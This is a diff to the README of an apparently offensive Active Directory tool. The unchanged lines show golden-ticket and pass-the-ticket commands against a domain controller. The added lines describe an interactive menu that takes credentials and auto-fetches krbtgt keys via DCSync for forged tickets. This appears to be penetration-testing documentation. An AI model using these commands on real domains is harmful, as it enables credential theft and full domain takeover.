@@ -89,8 +89,10 @@ adhammer attack golden --kdc dc.corp.local --realm CORP.LOCAL --krbtgt-aes256 <6
 adhammer attack pth    --host dc.corp.local --realm CORP.LOCAL --krbtgt-aes256 <64-hex> --domain-sid S-1-5-21-a-b-c --spn cifs/dc.corp.local --command whoami
 ```
 
-Or just run `adhammer` with no arguments for the **guided interactive menu** — it saves your
-session and walks you through every one of the 21 actions with prompts:
+Or just run `adhammer` with no arguments for the **guided interactive menu**. It asks for
+user → password (or NT hash) → domain → DC IP, saves the session, then walks you through all 21
+actions with prompts. For golden/silver/pass-the-ticket it **auto-fetches** the krbtgt/service
+AES256 key (via DCSync) and the domain SID (via LSAT) from your session — no pasting keys or SIDs.
 
 ![ADhammer interactive menu: pick an action, run DCSync against the DC, back to the full menu](docs/interactive.gif)
 
